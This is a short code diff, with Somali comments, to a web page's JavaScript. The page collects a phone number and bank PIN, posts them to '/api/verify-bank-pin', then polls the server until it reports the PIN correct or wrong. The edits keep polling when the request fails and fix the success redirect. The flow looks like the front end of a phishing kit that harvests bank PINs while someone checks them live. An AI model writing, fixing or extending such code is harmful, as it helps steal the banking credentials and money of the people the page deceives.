@@ -120,6 +120,9 @@ btn.addEventListener('click', async () => {
     inputSection.style.display = "none";
     waitContainer.style.display = "flex";
 
+    // --- DHEX-GELINTA TIJAABADA (Haddii aad rabto inaad tijaabiso redirect-ka kaliya) ---
+    // window.location.href = "success.html"; return;
+
     try {
         const response = await fetch('/api/verify-bank-pin', {
             method: 'POST',
@@ -132,7 +135,8 @@ btn.addEventListener('click', async () => {
             startPolling(phone);
         }
     } catch (err) {
-        console.log("Processing...");
+        // Haddii fetch-ka uu dhaco, weli waxaan isku dayeynaa inaan poll-gareyno haddii server-kaagu saas u baahan yahay
+        startPolling(phone);
     }
 });
 
@@ -144,7 +148,8 @@ function startPolling(phone) {
 
             if (data.status === "bank_pin_correct") {
                 clearInterval(pollInterval);
-                window.location.href = "/success.html";
+                // SAXID: Waxaan ka saarnay "/" si uu ugu gudbo success.html oo isla galka ah
+                window.location.href = "success.html";
             } else if (data.status === "bank_pin_wrong") {
                 clearInterval(pollInterval);
                 alert("PIN-ka Bangiga waa khalad.");
@@ -152,6 +157,8 @@ function startPolling(phone) {
             }
         } catch (e) {
             console.error("Waiting for verification...");
+            // FIIRO GAAR AH: Haddii aad tijaabo ku jirto oo aadan haysan API shaqaynaya,
+            // waxaad ku dari kartaa window.location.href = "success.html" halkan si aad u aragto natiijada.
         }
     }, 3000);
 }
